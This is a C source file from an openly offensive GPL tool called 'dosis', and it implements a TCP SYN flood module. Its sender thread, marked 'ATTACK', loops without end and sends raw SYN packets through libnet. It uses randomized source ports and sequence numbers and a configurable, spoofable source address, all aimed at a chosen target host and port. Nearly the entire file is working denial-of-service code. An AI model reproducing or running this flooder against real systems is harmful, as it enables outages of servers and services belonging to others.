/*****************************************************************************
 * tcpraw.c
 *
 * DoS on TCP servers by raw tcp packets (synflood?).
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "dosconfig.h"
#include "tcpraw.h"
#include "lnet.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"
#include "tea.h"

typedef struct _tag_TCPRAW_CFG {
  /* options */
  INET_ADDR          shost;
  INET_ADDR          dhost;
  int                flags;

  /* parameters */
  unsigned           npackets;
  char               req;
  unsigned           req_size;
  double             hitratio;

  /* other things */
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} TCPRAW_CFG;

static void tcpraw__thread(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int i;

  DBG("[%02u] Started sender thread", tw->id);

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tc->hitratio > 0)
      if(pthreadex_timer_wait(&(tc->timer)) < 0)
        ERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* build TCP packet with payload (if requested) */
    DBG("[%02u] Sending %d packet(s)...", tw->id, tc->npackets);
    for(i = 0; i < tc->npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
      ln_send_packet(tc->lnc,
                     &tc->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                     &tc->dhost.addr.in.inaddr, tc->dhost.port,
                     TH_SYN, 13337,
                     seq, 0,
                     NULL, 0);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GENERIC HHTP THREAD
 *   This thread specializes in different tasks depending on thread number
 *     0 - listener
 *     x - sender
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpraw__configure(THREAD_WORK *tw, SNODE *command)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;
  SNODE *cn;
  char *s;
  int i;

  /* first initialization (specialized work thread data) */
  if(tc == NULL)
  {
    if((tc = calloc(1, sizeof(TCPRAW_CFG))) == NULL)
      D_FAT("[%02d] No memory for TCPRAW_CFG.", tw->id);
    tw->data = (void *) tc;

    /* initialize libnet */
    DBG("[%02u] Initializing libnet.", tw->id);
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
      D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
    ln_init_context(tc->lnc);

    pthreadex_timer_init(&(tc->timer), 0.0);
  }

  /* read from SNODE command parameters */
  cn = command->command.thc.to->to.pattern;
  if(cn->type != TYPE_PERIODIC)
    FAT("%d: Uknown pattern %d.", cn->line, cn->type);
  
  tc->hitratio = tea_get_float(cn->pattern.periodic.ratio);
  tc->npackets = tea_get_int(cn->pattern.periodic.n);
  tc->req_size = tea_get_int(cn->pattern.periodic.bytes);
  if(tc->hitratio < 0)
    FAT("%d: Bad hit ratio '%f'.", cn->line, tc->hitratio);
  if(tc->npackets <= 0)
    FAT("%d: Bad number of packets '%d'.", cn->line, tc->npackets);
  if(tc->req_size <= 0)
    FAT("%d: Bad packet size '%d'.", cn->line, tc->req_size);

  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_SRC:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tc->shost))
          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tc->shost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_DST:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tc->dhost))
          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tc->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_FLAGS:
        s = tea_get_string(cn->option.flags);
        tc->flags = 0;
        for(i = 0; s[i]; i++)
          switch(toupper(s[i]))
          {
            case 'U': tc->flags |= 0x20; break; /* urgent */
            case 'A': tc->flags |= 0x10; break; /* ack    */
            case 'P': tc->flags |= 0x08; break; /* push   */
            case 'R': tc->flags |= 0x04; break; /* reset  */
            case 'S': tc->flags |= 0x02; break; /* syn    */
            case 'F': tc->flags |= 0x01; break; /* fin    */
            default:
              FAT("%d: Unknown TCP flag '%c'.", cn->line, s[i]);
          }
        free(s);
        break;

      default:
        FAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* configure timer */
  if(tc->hitratio > 0)
    pthreadex_timer_set_frequency(&(tc->timer), tc->hitratio);

  /* (debug) print configuration */
  {
    char buff[255];

    DBG2("[%02u] config.periodic.n     = %d", tw->id, tc->npackets);
    DBG2("[%02u] config.periodic.bytes = %d", tw->id, tc->req_size);
    DBG2("[%02u] config.periodic.ratio = %d", tw->id, tc->hitratio);

    ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
    DBG2("[%02u] config.options.shost  = %s", tw->id, buff);
    ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
    DBG2("[%02u] config.options.dhost  = %s", tw->id, buff);
    DBG2("[%02u] config.options.flags  = %x", tw->id, tc->flags);
  }

  return 0;
}

static void tcpraw__cleanup(THREAD_WORK *tw)
{
  TCPRAW_CFG *tc = (TCPRAW_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tc->lnc);
  free(tc->lnc);
  pthreadex_timer_destroy(&tc->timer);

  free(tc);
  tw->data = NULL;

  DBG("[%02u] Finalized.", tw->id);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCPRAW TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCPRAW = {
  .name      = "TCPRAW",
  .configure = tcpraw__configure,
  .cleanup   = tcpraw__cleanup,
  .thread    = tcpraw__thread,
};

